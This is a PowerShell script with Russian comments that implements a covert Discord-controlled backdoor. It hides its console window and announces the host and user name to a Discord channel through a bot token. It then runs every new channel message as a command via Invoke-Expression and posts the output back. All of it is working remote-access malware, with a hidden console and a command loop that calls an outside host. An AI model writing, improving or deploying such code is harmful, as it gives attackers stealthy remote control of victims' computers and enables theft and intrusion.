$token = "$tk"      # берётся из bat-файла
$chan  = "$ch"      # берётся из bat-файла

# ===================== СКРЫТИЕ КОНСОЛИ =====================
$t = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
Add-Type -MemberDefinition $t -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru | Out-Null
$p = Get-Process -Id $PID
if ($p.MainWindowHandle -ne 0) { [Win32Functions.Win32ShowWindowAsync]::ShowWindowAsync($p.MainWindowHandle, 0) | Out-Null }

# ===================== БЕЗОПАСНАЯ ОТПРАВКА СООБЩЕНИЯ =====================
function Send-DiscordMessage {
    param([string]$Content = " ")

    # Убираем нулевые байты и экранируем обратные кавычки (главная причина 400 Bad Request)
    $Content = $Content -replace "`0", "" -replace "`", "ˋ"

    $uri = "https://discord.com/api/v9/channels/$chan/messages"
    $boundary = [guid]::NewGuid().ToString()
    $LF = "`r`n"

    $bodyLines = @()
    $bodyLines += "--$boundary"
    $bodyLines += 'Content-Disposition: form-data; name="payload_json"'
    $bodyLines += ""
    $bodyLines += (@{ content = $Content } | ConvertTo-Json -Compress)
    $bodyLines += "--$boundary--"
    $body = [byte[]][char[]]($bodyLines -join $LF)

    $headers = @{
        "Authorization" = "Bot $token"
        "Content-Type"  = "multipart/form-data; boundary=$boundary"
    }

    try {
        Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body -TimeoutSec 10 -ErrorAction Stop | Out-Null
    } catch {
        # fallback на случай совсем проблемного контента
        try {
            $payload = @{ content = "Ошибка отправки (слишком большой/запрещённые символы)" } | ConvertTo-Json -Compress
            $simple = [byte[]][char[]]("--$boundary$LFContent-Disposition: form-data; name=`"payload_json`"$LF$LF$payload$LF--$boundary--")
            Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $simple | Out-Null
        } catch {}
    }
}

# ===================== ПОЛУЧЕНИЕ ПОСЛЕДНЕГО СООБЩЕНИЯ =====================
function Get-LastMessage {
    $headers = @{ "Authorization" = "Bot $token" }
    try {
        $msgs = Invoke-RestMethod -Uri "https://discord.com/api/v9/channels/$chan/messages?limit=1" -Headers $headers -TimeoutSec 10
        if ($msgs -and $msgs[0].author.bot -eq $false) {
            return $msgs[0].content.Trim()
        }
    } catch {}
    return $null
}

# ===================== СТАРТ =====================
$authenticated = $false
$lastCmd = ""

Send-DiscordMessage -Content ":hourglass_flowing_sand: **$env:COMPUTERNAME** | `$env:USERNAME` | Session Waiting..."

while ($true) {
    Start-Sleep -Seconds 4
    $cmd = Get-LastMessage

    if ($cmd -and $cmd -ne $lastCmd) {
        $lastCmd = $cmd
        $dir = (Get-Location).Path

        # Авторизация по имени компьютера (как было у тебя изначально)
        if (-not $authenticated) {
            if ($cmd -eq $env:COMPUTERNAME) {
                $authenticated = $true
                Send-DiscordMessage -Content ":white_check_mark: **$env:COMPUTERNAME** | Session Started!"
                Send-DiscordMessage -Content "``PS $dir>``"
                continue
            } else {
                continue
            }
        }

        # Управление сессией
        if ($cmd -match "^(close|exit)$") {
            Send-DiscordMessage -Content ":octagonal_sign: Session Closed."
            break
        }
        if ($cmd -eq "pause") {
            $authenticated = $false
            Send-DiscordMessage -Content ":pause_button: Session Paused."
            continue
        }

        # Выполнение команды
        try {
            $output = Invoke-Expression $cmd 2>&1 | Out-String
        } catch {
            $output = "Ошибка: $($_.Exception.Message)"
        }
        if (-not $output) { $output = "(нет вывода)" }

        # Разбиваем длинный вывод на куски по ~1900 символов
        $chunks = @()
        $current = ""
        foreach ($line in ($output -split "`n")) {
            if (($current + $line + "`n").Length -gt 1900) {
                $chunks += $current.TrimEnd()
                $current = ""
            }
            $current += $line + "`n"
        }
        if ($current) { $chunks += $current.TrimEnd() }

        foreach ($chunk in $chunks) {
            Send-DiscordMessage -Content "``````$chunk``````"
            Start-Sleep -Milliseconds 400
        }

        Send-DiscordMessage -Content "``PS $dir>``"
    }
}
